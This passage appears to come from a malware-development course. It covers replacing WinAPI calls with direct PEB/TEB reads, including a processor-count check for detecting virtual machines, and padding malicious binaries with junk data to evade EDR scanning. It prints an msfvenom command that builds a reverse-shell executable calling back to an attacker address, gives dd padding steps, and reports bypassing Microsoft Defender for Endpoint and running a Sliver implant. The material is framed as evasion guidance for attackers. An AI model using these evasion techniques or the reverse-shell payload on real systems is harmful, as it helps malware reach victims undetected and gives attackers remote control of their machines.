	// Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// If 'pTmp' starts with the "windir" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"windir")
			break;

		// Else, move to to the next element
		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);
		
		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (PWSTR)&pTmp[i + sizeof(WCHAR)]; // skipping the equal sign
		}
	}


	return NULL;
}
```

#### GetNumberOfProcessors

Unlike the previous functions,??`GetNumberOfProcessors`??can be further utilized as an anti-analysis approach, where detecting a small number of processors can be an indicator of a virtualized environment. The??`GetNumberOfProcessors`??function searches for the "NUMBER_OF_PROCESSORS" keyword, skips over the equal sign and then calls??[wcstoul](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strtoul-strtoul-l-wcstoul-wcstoul-l?view=msvc-170)??to convert the fetched value's data type from??`PWSTR`??to??`DWORD`.

`GetNumberOfProcessors`??returns the number of processors on a system based off its environment variables.

```c
DWORD GetNumberOfProcessors() { 

	// Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// Get the "Environment" pointer in the "RTL_USER_PROCESS_PARAMETERS" structure 
	PBYTE	pTmp = (PBYTE)pPeb->ProcessParameters->Environment;

	while (1)
	{
		// Get the length of "pTmp"
		int j = lstrlenW(pTmp);

		// If zero, break
		if (!j) {
			pTmp = NULL;
			break;
		}

		// If 'pTmp' starts with the "NUMBER" keyword, break
		if (*(ULONG_PTR*)pTmp == *(ULONG_PTR*)L"NUMBER") // NUMBER_OF_PROCESSORS
			break;

		pTmp = (PBYTE)pTmp + (j * sizeof(WCHAR)) + sizeof(WCHAR);
	}


	if (pTmp) {
		// The length of "pTmp" in bytes
		int j = lstrlenW(pTmp) * sizeof(WCHAR);

		// skipping the equal sign & converting LPWSTR to DWORD
		for (int i = 0; i <= j; i++) {
			if ((WCHAR)pTmp[i] == (WCHAR)L'=')
				return (DWORD)wcstoul((PWSTR)&pTmp[i + sizeof(WCHAR)], NULL, 10);
		}
	}


	return NULL;
}
```

### Replacing GetCurrentDirectory

The??`GetCurrentDirectory`??WinAPI is used to retrieve the current directory path of the current process. The current directory value can be retrieved from within the??`CurrentDirectory`??member inside the??`RTL_USER_PROCESS_PARAMETERS`??structure. The??`CurrentDirectory`??member is declared as a??[CURDIR](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2615)??structure.

#### CURDIR Structure

The??`CURDIR`??structure is shown below.

```c
typedef struct _CURDIR
{
    UNICODE_STRING DosPath;	// UNICODE_STRING.Buffer = Directory path && UNICODE_STRING.Length = Length of path
    HANDLE Handle;
} CURDIR, *PCURDIR;
```

#### GetCurrentDir Function

The??`GetCurrentDir`??function below utilizes the previous information to return the path of the current directory of an implementation. It takes an optional parameter,??`pSize`, and sets it to the length of the returned string.

```c
PWSTR GetCurrentDir(OPTIONAL OUT PSIZE_T pSize) {
	//  Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;
		
	// If "pSize" is passed, set it to the length of the returned buffer
	if (pSize)
		*pSize = (SIZE_T)pPeb->ProcessParameters->CurrentDirectory.DosPath.Length;
		
	// return the path of the current directory 
	return (PWSTR)pPeb->ProcessParameters->CurrentDirectory.DosPath.Buffer;
}
```

### Replacing GetCommandLine

The??`GetCommandLine`??WinAPI is used to retrieve the command-line string for the current process. The??`CommandLine`??member is defined as a??`UNICODE_STRING`??structure, and is found inside the??`RTL_USER_PROCESS_PARAMETERS`??structure.

The??`GetCmdLine`??function below utilizes the previously stated information to return the command-line argument passed to the current process.??`GetCmdLine`??takes an optional parameter,??`pSize`, and sets it to the length of the returned string.

```c
PWSTR GetCmdLine(OPTIONAL OUT PSIZE_T pSize) {
	
	//  Get the PEB structure
	PPEB pPeb = NULL;
	if ((pPeb = GetPeb()) == NULL)
		return NULL;

	// If "pSize" is passed, set it to the length of the returned buffer
	if (pSize)
		*pSize = (SIZE_T)pPeb->ProcessParameters->CommandLine.Length;
	
	// return the command-line string
	return (PWSTR)pPeb->ProcessParameters->CommandLine.Buffer;
}
```

### Replacing GetCurrentProcessId

`GetCurrentProcessId`??is used to retrieve the process identifier of the calling process. To replace this WinAPI, one should first check if this is doable by inspecting it under a debugger or a disassembler.

#### 64-bit Systems

The following image shows IDA's representation of the 64-bit??`GetCurrentProcessId`??WinAPI.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-735299046-e157fd3b-4155-4959-b453-31707b8515d9.png)

Based on the above image,??`GetCurrentProcessId`??executes the following instructions:

- `mov rax, gs:30h`??- Loads a value that's located at offset??`0x30`??(48 in decimal) from the??`gs`??register.
    
- `mov eax, [rax+40h]`??- Reads??`0x40`??bytes (64 in decimal) from the??`rax`??register.
    

#### 32-bit Systems

On the other hand, the 32-bit??`GetCurrentProcessId`??WinAPI looks like the following.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-835299616-4111c17e-b31b-4228-8199-cf10b73b7bae.png)

On the 32-bit system,??`GetCurrentProcessId`??executes the following instructions:

- `mov eax, large fs:18h`??- Loads a value that's located at offset??`0x18`??(24 in decimal) from the??`fs`??register.
    
- `mov eax, [eax+20h]`??- Reads??`0x20`??bytes (32 in decimal) from the??`eax`??register.
    

Based on the above analysis, when aiming to replace the functionality of??`GetCurrentProcessId`??on 64-bit systems, one should retrieve a??`DWORD`??value from a memory location located??`0x40`??bytes beyond the??`gs`??register. Whereas on 32-bit systems, the same value should be obtained from a memory location positioned??`0x20`??bytes past the??`fs`??register. The first instruction from both 64-bit and 32-bit versions is handled using the??`__readgsdword`??and??`__readfsdword`??functions, respectively.

#### _GetCurrentProcessId Function

The following function utilizes??`__readgsdword`??and??`__readfsdword`??to read the specified number of bytes.

```c
DWORD _GetCurrentProcessId() {

#if _WIN64
	return (DWORD)(__readgsdword(0x40));
#elif _WIN32
	return (DWORD)(__readfsdword(0x20));
#endif

	return NULL;
}
```

### Replacing GetCurrentThreadId

The??`GetCurrentThreadId`??WinAPI function is used to retrieve the thread identifier of the calling thread.

#### 64-bit Systems

Under IDA, the function looks like this on 64-bit systems

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-935300352-a5b9023e-537f-4ed0-b002-7ddce35d185c.png)

#### 32-bit Systems

On the other hand, on 32-bit systems,??`GetCurrentThreadId`??looks like the following

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-10-7405.png)

As one can see, both??`GetCurrentThreadId`??and??`GetCurrentProcessId`??execute similar instructions, with the only difference being the offset that they read from. On 64-bit systems,??`GetCurrentThreadId`??read the TID from??`0x48`??bytes past the??`gs`??register. While on 32-bit systems,??`GetCurrentThreadId`??reads the TID from a position of??`0x24`??bytes past the??`fs`??register.

The below??`_GetCurrentThreadId`??function utilizes the??`__readgsdword`??and??`__readfsdword`??to read the specified number of bytes.

```c
DWORD _GetCurrentThreadId() {

#if _WIN64
	return (DWORD)(__readgsdword(0x48));
#elif _WIN32
	return (DWORD)(__readfsdword(0x24));
#endif

	return NULL;
}
```

### Demo

The below images show the output of all the implemented functions.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-11-235301033-cf4fba34-0451-4555-9ee8-0e560e58519a.png)

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-12-235301123-1a360781-5b0d-42b7-af60-02ba6d7bd470.png)

### Video Demo

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-11-235301033-cf4fba34-0451-4555-9ee8-0e560e58519a.png)](https://maldevacademy.s3.amazonaws.com/new/update-one/WinAPIRep-subs-demo.mp4)
# Evasion With File Bloating

### Introduction

File bloating is an evasion technique where a malicious file is inflated with junk data, usually by appending a large number of null bytes to the end of the file. This has been an effective technique against some security solutions because many security solutions have a limit as to the file size they are capable of scanning. This limitation exists because security solutions, specifically host-based ones, wish to avoid excessive consumption of system resources during scans to prevent the machine from experiencing lag or slowdown.

This module will demonstrate ways to bloat a file and test the effectiveness of the technique against EDRs. The binary that will be bloated in this module is one generated from Msfvenom using??`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.130 LPORT=443 -f exe -o mal.exe`.

### Appending Null Bytes

As previously mentioned, it's common to append a large number of null bytes to the file. There are many ways to do so, in this module the??`dd`??command will be used on Kali Linux.

```
# Make a copy of mal.exe
cp mal.exe mal-200mb.exe

# Add 200mb worth of null bytes to the end of the file
dd if=/dev/zero bs=1M count=200 >> mal-200mb.exe
```

It's possible to verify that null bytes were appended by using??`xxd`??to view the hex contents of the file. A large number of zeros should be appended to the end of the file.

```
xxd mal-200mb.exe | more
```

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/file-bloating-xxd-1.png)

#### EDR Test (1)

The following example shows how the detection behavior of the two files,??`mal-200mb.exe`??and??`mal.exe`??are different. While both files are eventually detected,??`mal-200mb.exe`??is only detected upon execution, therefore successfully bypassing static detection.

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-1-cover.png)](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-1.mp4)

In fact, the??`mal-200mb.exe`'s process is only terminated after the network connection is established. This means that the file contents aren't being flagged, rather the network connection arising from the process is the one triggering the EDR.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/file-bloating-nc-success.png)

#### EDR Test (2)

When the same file bloating technique is implemented on a binary from another C2 framework, such as Sliver, the binary successfully runs with no issues.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/file-bloating-sliver-running.png)

The video demo is shown below.

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-2-cover.png)](https://maldevacademy.s3.amazonaws.com/new/update-two/demo-2.mp4)

### Large Metadata

Another way of bloating a file is by including large metadata during the compilation process. Including metadata within a file was demonstrated in the??_Binary Metadata Modification_??module. The steps are listed out below:

1. Create a large file of random data. In this case, a 200MB file of??`FF`??bytes was created using??`dd if=/dev/zero bs=1M count=200 | tr '\000' '\377' > file.bin`.
    
2. Create a??`.rc`??file in the Visual Studio project. Reference the??_Binary Metadata Modification_??module for a refresher if necessary.
    
3. Add??`IDR_BINARY_FILE BINARY file.bin`??to the??`.rc`??file.
    
4. Compile the solution.
    

This should create a large file that includes??`file.bin`??within the binary. To verify this claim, use??`xxd`??to inspect the binary and look for the??`FF`??bytes.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/large-metadata.png)

#### EDR Test (3)

A modified version of the code found in??_Local Payload Execution - Shellcode_??was used for this demonstration. The code was then further modified to include the large??`file.bin`??file that was shown in the previous section. Next, the binary was tested against Microsoft Defender For Endpoint and successfully executed.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/MDE-Test.png)

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/MDE-Test-2.png)

![Image](https://maldevacademy.s3.amazonaws.com/new/update-two/MDE-Test-3.png)

### Conclusion

File bloating is a simple technique that can be implemented on any binary for additional evasion. Keep in mind that different security solutions will react differently to large binaries. For example, Microsoft Defender For Endpoint still flags malicious content within a large binary. Therefore it's important to use file bloating as an added evasion technique in combination with other techniques such as payload encryption, IAT obfuscation etc.
